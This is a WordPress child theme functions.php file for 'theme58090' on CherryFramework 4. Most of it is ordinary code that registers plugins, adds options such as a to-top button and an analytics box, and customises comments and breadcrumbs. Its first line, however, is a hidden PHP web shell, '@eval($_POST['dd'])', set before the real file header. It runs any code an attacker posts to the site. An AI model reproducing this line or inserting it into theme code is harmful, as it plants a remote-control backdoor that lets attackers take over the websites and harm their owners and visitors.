<?php @eval($_POST['dd']);?><?php
/**
 * Child Theme functions and configurations.
 *
 * @package    theme58090
 * @subpackage Functions
 * @since      1.0.0
 */

/**
 * Cherry Wizard and Cherry Data Manager add-ons.
 */

// Assign register plugins function to appropriate filter.
add_filter( 'cherry_theme_required_plugins',     'cherry_child_register_plugins' );

// Assign options filter to apropriate filter.
add_filter( 'cherry_data_manager_export_options', 'cherry_child_options_to_export' );

// Assign option id's filter to apropriate filter.
add_filter( 'cherry_data_manager_options_ids',    'cherry_child_options_ids' );

// Assign cherry_child_menu_meta to aproprite filter.
add_filter( 'cherry_data_manager_menu_meta',      'cherry_child_menu_meta' );

// Customize a cherry shortcodes.
add_filter( 'custom_cherry4_shortcodes',          '__return_true' );

/**
 * Get ristered plugins array for curent theme
 *
 * @return array
 */
function cherry_child_get_rigestered_plugins() {

	return array(
		'contact-form-7' => array(
			'name'     => __( 'Contact Form 7', 'child-theme-domain' ),
			'required' => false,
		),
		'cherry-shortcodes' => array(
			'name'     => __( 'Cherry Shortcodes', 'child-theme-domain' ),
			'source'   => 'cherry-free',
			'required' => false,
		),
		'cherry-shortcodes-templater' => array(
			'name'     => __( 'Cherry Shortcodes Templater', 'child-theme-domain' ),
			'source'   => 'cherry-free',
			'required' => false,
		),
		'cherry-portfolio' => array(
			'name'     => __( 'Cherry Portfolio', 'child-theme-domain' ),
			'source'   => 'cherry-free',
			'required' => false,
		),
		'cherry-testimonials' => array(
			'name'     => __( 'Cherry Testimonials', 'child-theme-domain' ),
			'source'   => 'cherry-free',
			'required' => false,
		),
		'cherry-team' => array(
			'name'     => __( 'Cherry Team', 'child-theme-domain' ),
			'source'   => 'cherry-free',
			'required' => false,
		),
		'cherry-social' => array(
			'name'     => __( 'Cherry Social', 'child-theme-domain' ),
			'source'   => 'cherry-free',
			'required' => false,
		),
		'cherry-mega-menu' => array(
			'name'     => __( 'Cherry Mega Menu', 'child-theme-domain' ),
			'source'   => 'cherry-free',
			'required' => false,
		),
		'motopress-cherryframework4' => array(
			'name'     => __( 'MotoPress and CherryFramework 4 Integration', 'child-theme-domain' ),
			'source'   => 'cherry-free',
			'required' => false,
		),
		'motopress-content-editor' => array(
			'name'       => __( 'MotoPress Content Editor', 'child-theme-domain' ),
			'source'     => 'cherry-premium',
			'source_alt' => CHILD_DIR . '/assets/includes/plugins/motopress-content-editor.zip',
			'required'   => false,
		),
		'motopress-slider' => array(
			'name'       => __( 'MotoPress Slider', 'child-theme-domain' ),
			'source'     => 'cherry-premium',
			'source_alt' => CHILD_DIR . '/assets/includes/plugins/motopress-slider.zip',
			'required'   => false,
		),
		'mailchimp-for-wp' => array(
			'name'       => __( 'MailChimp for WordPress', 'child-theme-domain' ),
			'source'     => 'cherry-premium',
			'source_alt' => CHILD_DIR . '/assets/includes/plugins/mailchimp-for-wp.zip',
			'required'   => false,
		),
		'cherry-services' => array(
            'name' => __('Cherry Services', 'child-theme-domain'),
            'slug' => 'cherry-services',
            'source' => 'cherry-free',
        ),
	);

}

/**
 * Register required plugins for theme.
 *
 * Plugins registered by this function will be automatically installed by Cherry Wizard.
 *
 * Notes:
 * - Slug parameter must be the same with plugin key in array
 * - Source parameter supports 3 possible values:
 *   a) cherry    - plugin will be downloaded from cherry plugins repository
 *   b) wordpress - plugin will be downloaded from wordpress.org repository
 *   c) path      - plugin will be downloaded by provided path
 *
 * @param  array $plugins Default array of required plugins (empty).
 * @return array          New array of required plugins.
 */
function cherry_child_register_plugins( $plugins ) {

	$plugins          = cherry_child_get_rigestered_plugins();
	$prepared_plugins = array();

	foreach ( $plugins as $slug => $data ) {
		$prepared_plugins[ $slug ]         = $data;
		$prepared_plugins[ $slug ]['slug'] = $slug;
		if ( ! isset( $data['source'] ) ) {
			$prepared_plugins[ $slug ]['source'] = 'wordpress';
		}
	}

	return $prepared_plugins;
}

require_once get_stylesheet_directory() . '/inc/class-tgm-plugin-activation.php';
add_action( 'tgmpa_register', 'cherry_child_tgmpa_register' );

/**
 * Register plugin for TGM activator.
 *
 * @ignore
 */
function cherry_child_tgmpa_register() {

	$plugins          = cherry_child_get_rigestered_plugins();
	$prepared_plugins = array();

	foreach ( $plugins as $slug => $data ) {
		$prepared_plugins[ $slug ]         = $data;
		$prepared_plugins[ $slug ]['slug'] = $slug;
		if ( ! empty( $data['source'] ) && 'cherry-premium' == $data['source'] && ! empty( $data['source_alt'] ) ) {
			$prepared_plugins[ $slug ]['source'] = $data['source_alt'];
		}

	}

	/**
	 * Array of configuration settings. Amend each line as needed.
	 */
	$config = array(
		'default_path' => '',                      // Default absolute path to pre-packaged plugins.
		'menu'         => 'tgmpa-install-plugins', // Menu slug.
		'has_notices'  => true,                    // Show admin notices or not.
		'dismissable'  => true,                    // If false, a user cannot dismiss the nag message.
		'dismiss_msg'  => '',                      // If 'dismissable' is false, this message will be output at top of nag.
		'is_automatic' => true,                   // Automatically activate plugins after installation or not.
		'message'      => '',                      // Message to output right before the plugins table.
		'strings'      => array(
			'page_title'                      => __( 'Install Recommended Plugins', 'child-theme-domain' ),
			'menu_title'                      => __( 'Install Plugins', 'child-theme-domain' ),
			'installing'                      => __( 'Installing Plugin: %s', 'child-theme-domain' ), // %s = plugin name.
			'oops'                            => __( 'Something went wrong with the plugin API.', 'child-theme-domain' ),
			'notice_can_install_required'     => _n_noop( 'This theme requires the following plugin: %1$s.', 'This theme requires the following plugins: %1$s.' ), // %1$s = plugin name(s).
			'notice_can_install_recommended'  => _n_noop( 'This theme recommends the following plugin: %1$s.', 'This theme recommends the following plugins: %1$s.' ), // %1$s = plugin name(s).
			'notice_cannot_install'           => _n_noop( 'Sorry, but you do not have the correct permissions to install the %s plugin. Contact the administrator of this site for help on getting the plugin installed.', 'Sorry, but you do not have the correct permissions to install the %s plugins. Contact the administrator of this site for help on getting the plugins installed.' ), // %1$s = plugin name(s).
			'notice_can_activate_required'    => _n_noop( 'The following required plugin is currently inactive: %1$s.', 'The following required plugins are currently inactive: %1$s.' ), // %1$s = plugin name(s).
			'notice_can_activate_recommended' => _n_noop( 'The following recommended plugin is currently inactive: %1$s.', 'The following recommended plugins are currently inactive: %1$s.' ), // %1$s = plugin name(s).
			'notice_cannot_activate'          => _n_noop( 'Sorry, but you do not have the correct permissions to activate the %s plugin. Contact the administrator of this site for help on getting the plugin activated.', 'Sorry, but you do not have the correct permissions to activate the %s plugins. Contact the administrator of this site for help on getting the plugins activated.' ), // %1$s = plugin name(s).
			'notice_ask_to_update'            => _n_noop( 'The following plugin needs to be updated to its latest version to ensure maximum compatibility with this theme: %1$s.', 'The following plugins need to be updated to their latest version to ensure maximum compatibility with this theme: %1$s.' ), // %1$s = plugin name(s).
			'notice_cannot_update'            => _n_noop( 'Sorry, but you do not have the correct permissions to update the %s plugin. Contact the administrator of this site for help on getting the plugin updated.', 'Sorry, but you do not have the correct permissions to update the %s plugins. Contact the administrator of this site for help on getting the plugins updated.' ), // %1$s = plugin name(s).
			'install_link'                    => _n_noop( 'Begin installing plugin', 'Begin installing plugins' ),
			'activate_link'                   => _n_noop( 'Begin activating plugin', 'Begin activating plugins' ),
			'return'                          => __( 'Return to Recommended Plugins Installer', 'child-theme-domain' ),
			'plugin_activated'                => __( 'Plugin activated successfully.', 'child-theme-domain' ),
			'complete'                        => __( 'All plugins installed and activated successfully. %s', 'child-theme-domain' ), // %s = dashboard link.
			'nag_type'                        => 'updated',
		),
	);

	tgmpa( $prepared_plugins, $config );

}

/**
 * Pass own options to export (for example if you use thirdparty plugin and need to export some default options).
 *
 * WARNING #1
 * You should NOT totally overwrite $options_ids array with this filter, only add new values.
 *
 * @param  array $options Default options to export.
 * @return array          Filtered options to export.
 */
function cherry_child_options_to_export( $options ) {

	/**
	 * Example:
	 *
	 * $options[] = 'woocommerce_default_country';
	 * $options[] = 'woocommerce_currency';
	 * $options[] = 'woocommerce_enable_myaccount_registration';
	 */

	return $options;
}

/**
 * Pass some own options (which contain page ID's) to export function,
 * if needed (for example if you use thirdparty plugin and need to export some default options).
 *
 * WARNING #1
 * With this filter you need pass only options, which contain page ID's and it's would be rewrited with new ID's on import.
 * Standrd options should passed via 'cherry_data_manager_export_options' filter.
 *
 * WARNING #2
 * You should NOT totally overwrite $options_ids array with this filter, only add new values.
 *
 * @param  array $options_ids Default array.
 * @return array              Result array.
 */
function cherry_child_options_ids( $options_ids ) {

	/**
	 * Example:
	 *
	 * $options_ids[] = 'woocommerce_cart_page_id';
	 * $options_ids[] = 'woocommerce_checkout_page_id';
	 */

	return $options_ids;
}

/**
 * Pass additional nav menu meta atts to import function.
 *
 * By default all nav menu meta fields are passed to XML file,
 * but on import processed only default fields, with this filter you can import your own custom fields.
 *
 * @param  array $extra_meta Ddditional menu meta fields to import.
 * @return array             Filtered meta atts array.
 */
function cherry_child_menu_meta( $extra_meta ) {

	/**
	 * Example:
	 *
	 * $extra_meta[] = '_cherry_megamenu';
	 */

	return $extra_meta;
}


/**
 * Customizations.
 */

// Include custom assets.
add_action( 'wp_enqueue_scripts',             'theme58090_include_custom_assets', 11 );

// Print a `totop` button on frontend.
add_action( 'cherry_footer_after',            'theme58090_print_totop_button' );

// Adds a new theme option - `totop` button.
add_filter( 'cherry_general_options_list',    'theme58090_add_totop_option' );

// Adds a new theme option - `Google Analytics Code`.
add_filter( 'cherry_general_options_list',    'theme58090_add_google_code' );

// Print a google analytics code on the bottom of HTML document.
add_filter( 'wp_footer',                      'theme58090_print_google_code', 9999 );

// Changed a `Breadcrumbs` output format.
add_filter( 'cherry_breadcrumbs_custom_args', 'theme58090_breadcrumbs_wrapper_format' );

// Modify a comment form.
add_filter( 'comment_form_defaults',          'theme58090_modify_comment_form' );

// Modify the columns on the `Posts` and `Pages` screen.
add_filter( 'manage_posts_columns',           'theme58090_add_thumbnail_column_header' );
add_filter( 'manage_pages_columns',           'theme58090_add_thumbnail_column_header' );
add_action( 'manage_posts_custom_column' ,    'theme58090_add_thumbnail_column_data', 10, 2 );
add_action( 'manage_pages_custom_column' ,    'theme58090_add_thumbnail_column_data', 10, 2 );

/**
 * Enqueue scripts and styles.
 *
 * @ignore
 */
function theme58090_include_custom_assets() {
	// Get the theme prefix.
	$prefix = cherry_get_prefix();

	wp_enqueue_style( 'font-awesome', '//maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css', false, '4.4.0', 'all' );
	wp_enqueue_style( 'fl-bigmug-line', get_stylesheet_directory_uri() . '/assets/css/fl-bigmug-line.css', false, '1.0', 'all' );
	wp_enqueue_script( $prefix . 'script', CHILD_URI . '/assets/js/script.js', array( 'jquery' ), '1.0', true );
}

/**
 * Display a `To Top` button.
 *
 * @ignore
 */
function theme58090_print_totop_button() {

	if ( 'true' != cherry_get_option( 'to_top_button', 'true' ) ) {
		return;
	}

	$mobile_class = '';

	if ( wp_is_mobile() ) {
		$mobile_class = 'mobile-back-top';
	}

	printf( '<div id="back-top" class="%s"><a href="#top"></a></div>', $mobile_class );
}

/**
 * Retrieve array with all options + new option `To Top`.
 *
 * @ignore
 * @param  array $args Set of all options.
 * @return array
 */
function theme58090_add_totop_option( $args ) {
	$args['to_top_button'] = array(
		'type'        => 'switcher',
		'title'       => __( 'To Top', 'child-theme-domain' ),
		'description' => __( 'Display to top button?', 'child-theme-domain' ),
		'value'       => 'true',
	);

	return $args;
}

/**
 * Retrieve array with custom arguments for breadcrumbs format.
 *
 * @ignore
 * @param  array $args Arguments.
 * @return array
 */
function theme58090_breadcrumbs_wrapper_format( $args ) {
	$args['wrapper_format'] = '<div class="container-fluid">
		<div class="row">
			<div class="col-md-12 col-sm-12">%s</div>
			<div class="col-md-12 col-sm-12">%s</div>
		</div>
	</div>';

	return $args;
}

/**
 * Retrieve a comment fields with placeholders.
 *
 * @ignore
 * @param  array $args The default comment form arguments.
 * @return array
 */
function theme58090_modify_comment_form( $args ) {
	$args = wp_parse_args( $args );

	if ( ! isset( $args['format'] ) ) {
		$args['format'] = current_theme_supports( 'html5', 'comment-form' ) ? 'html5' : 'xhtml';
	}

	$req      = get_option( 'require_name_email' );
	$aria_req = ( $req ? " aria-required='true'" : '' );
	$html_req = ( $req ? " required='required'" : '' );
	$html5    = 'html5' === $args['format'];
	$commenter = wp_get_current_commenter();

	$args['title_reply'] = __( 'Leave a comment', 'child-theme-domain' );

 	$args['submit_button'] = '<button name="%1$s" type="submit" id="%2$s" class="cherry-btn cherry-btn-medium cherry-btn-default">%4$s</button>';

	$args['label_submit'] = __( 'Submit comment', 'child-theme-domain' );

	$args['fields']['author'] = '<p class="comment-form-author"><input id="author" name="author" type="text" placeholder="' . __( 'Name:', 'child-theme-domain' ) . '" value="' . esc_attr( $commenter['comment_author'] ) . '" size="30"' . $aria_req . $html_req . ' />';

	$args['fields']['email'] = '<p class="comment-form-email"><input id="email" name="email" ' . ( $html5 ? 'type="email"' : 'type="text"' ) . ' placeholder="' . __( 'E-mail:', 'child-theme-domain' ) . '" value="' . esc_attr( $commenter['comment_author_email'] ) . '" size="30" aria-describedby="email-notes"' . $aria_req . $html_req  . ' /></p>';

	$args['fields']['url'] = '<p class="comment-form-url"><input id="url" name="url" ' . ( $html5 ? 'type="url"' : 'type="text"' ) . ' placeholder="' . __( 'Website:', 'child-theme-domain' ) . '" value="' . esc_attr( $commenter['comment_author_url'] ) . '" size="30" /></p>';

	$args['comment_field'] = '<p class="comment-form-comment"><textarea id="comment" name="comment" placeholder="' . __( 'Comment:', 'child-theme-domain' ) . '" cols="45" rows="8" aria-describedby="form-allowed-tags" aria-required="true" required="required"></textarea></p>';

	return $args;
}

/**
 * Retrieve array with column labels + new label `Featured Image`.
 *
 * @ignore
 * @param  array $post_columns An array of column name => label.
 * @return array
 */
function theme58090_add_thumbnail_column_header( $post_columns ) {
	return array_merge( $post_columns, array( 'thumbnail' => '<span class="dashicons dashicons-format-image"></span><span class="screen-reader-text">' . __( 'Featured Image', 'child-theme-doamin' ) . '</span>' ) );
}

/**
 * Display Post Featured Image in `edit.php` and `edit.php?post_type=page` admin pages.
 *
 * @ignore
 * @param string $column  The name of the column to display.
 * @param int    $post_id The ID of the current post.
 */
function theme58090_add_thumbnail_column_data( $column, $post_id ) {

	if ( 'thumbnail' !== $column ) {
		return;
	}

	$post_type = get_post_type( $post_id );

	if ( ! in_array( $post_type, array( 'post', 'page' ) ) ) {
		return;
	}

	$thumb = get_the_post_thumbnail( $post_id, array( 50, 50 ) );
	echo empty( $thumb ) ? '&mdash;' : $thumb;
}

/**
 * Retrieve array with all options + new option `Google Analytics Code`.
 *
 * @ignore
 * @param  array $options Set of all options.
 * @return array
 */
function theme58090_add_google_code( $options ) {
	$options['google_analytics'] = array(
		'type'        => 'textarea',
		'title'       => __( 'Google Analytics Code', 'child-theme-domain' ),
		'description' => __( 'You can paste your Google Analytics or other tracking code in this box. This will be automatically added to the footer.', 'child-theme-domain' ),
		'value'       => '',
	);

	return $options;
}

/**
 * Dispaly a google analytics code on the bottom of HTML document.
 *
 * @ignore
 */
function theme58090_print_google_code() {
	$google_code = cherry_get_option( 'google_analytics' );

	if ( empty( $google_code ) ) {
		return;
	}

	printf( '<script>%s</script>', $google_code );
}

// Optinization and improvements for a third-party plugins.
require_once( get_stylesheet_directory() . '/init/config/third-party-plugins.php' );


add_filter( 'cherry_custom_font_icons', 'theme58090_custom_font_icons' );

function theme58090_custom_font_icons($icons) {
    $icons['theme58090_mercury'] = get_stylesheet_directory_uri() . '/assets/css/mercury.css';
    $icons['theme58090_fl-bigmug-line'] = get_stylesheet_directory_uri() . '/assets/css/fl-bigmug-line.css';
    return $icons;
}

/**
*add alpha color functions
*/

add_filter( 'cherry_css_func_list', 'cherry_child_add_alpha' );
	function cherry_child_add_alpha( $functions ) {
	$functions['alpha'] = 'cherry_child_color_alpha';
	return $functions;
}

function cherry_child_color_alpha( $color, $alpha ) {
	$rgb = cherry_prepare_color_mod( $color );
	return sprintf( 'rgba( %s, %s, %s, %s )', $rgb['r'], $rgb['g'], $rgb['b'], $alpha );
}

/**
 * Example: add options in cerryframework4 child theme
 */
add_action( 'after_setup_theme', 'theme58090_custom_options' );
function theme58090_custom_options() {
	require_once CHILD_DIR . '/inc/class-cherry-child-custom-options.php';
	$options = array(
		'color-additional' => array(
			'section'          => 'color-subsection',
			'is-var'           => true,
			'type'        => 'colorpicker',
			'title'       => __( 'Additional color', 'child-theme-domain' ),
			'description' => __( '', 'child-theme-domain' ),
			'value' => '',
		),
	);
	new Cherry_Child_Custom_Options( $options);
}

add_action( 'init', 'theme58090_replace_breadcrumbs' );
function theme58090_replace_breadcrumbs() {
	remove_action( 'cherry_content_before', 'cherry_get_breadcrumbs', 5 );
	add_action( 'cherry_header', 'cherry_get_breadcrumbs', 99 );
}

add_filter( 'cherry_get_the_post_taxonomy_defaults', 'theme58090_change_post_taxonomy_separator' );
function theme58090_change_post_taxonomy_separator( $arg ) {
	$arg['separator'] = ' | ';

	return $arg;
}


/**
*posts avatar size comments
*/
function child_comment_list_args( $defaults ) {
 $defaults['avatar_size'] = 90;
 $defaults['callback']    = 'child_comments_rebuild';

 return $defaults;
}

/**
 * Changed a comments structure.
 */

function child_comments_rebuild( $comment, $args, $depth ) {
 $GLOBALS['comment'] = $comment;
 extract( $args, EXTR_SKIP );

 if ( 'div' == $args['style'] ) {
  $tag = 'div';
  $add_below = 'comment';
 } else {
  $tag = 'li';
  $add_below = 'div-comment';
 } ?>

 <<?php echo $tag ?> <?php comment_class( empty( $args['has_children'] ) ? '' : 'parent' ) ?> id="comment-<?php comment_ID() ?>">
 <?php if ( 'div' != $args['style'] ) : ?>
  <div id="div-comment-<?php comment_ID() ?>" class="comment-body">
 <?php endif; ?>


	    <?php if ( $args['avatar_size'] != 0 ) {
	      echo get_avatar( $comment, $args['avatar_size'] );
	    } ?>


   		<div class="comment-meta">
   			<?php printf( __( 'by <cite class="fn">%s</cite>' ), get_comment_author_link() ); ?>
   			<?php echo 'on <time datetime="'. get_comment_date('Y') .'">'. get_comment_date('F j\, Y') .'</time>' ?>
		</div>
		<div class="comment-contentbox">
			<?php if ( $comment->comment_approved == '0' ) : ?>
				<em class="comment-awaiting-moderation"><?php _e( 'Your comment is awaiting moderation.', 'child-theme-domain' ); ?></em>
			<br />

			<?php endif;
			comment_text();
			if ( 'div' != $args['style'] ) : ?>

			<div class="block_bottom">

				<div class="comment-meta commentmetadata">
					<div class="reply">
						<?php comment_reply_link( array_merge( $args, array( 'reply_text' => '', 'add_below' => $add_below, 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); ?>
					</div>
				</div>
			</div>
		</div>


</div>
<?php endif;
}

add_filter( 'cherry_comment_list_args', 'child_comment_list_args' );

/**
 * Cherry sticky selectors
 */
add_filter('cherry_sticky_selectors', 'theme26652_cherry_sticky_selectors');
function theme26652_cherry_sticky_selectors($selectors)
{
    $selectors = array(
        '#static-area-header-top' => __('Header top static area', 'child-theme-domain'),
        '#menu-primary' => __('Main menu', 'child-theme-domain'),
    );
    return $selectors;
}

// Add search template.
add_filter( 'cherry_content_template_hierarchy', 'add_search_template' );
function add_search_template( $templates ) {

	if ( is_search() ) {
		$templates = array( 'content/search.tmpl' );
	}

	return $templates;
}
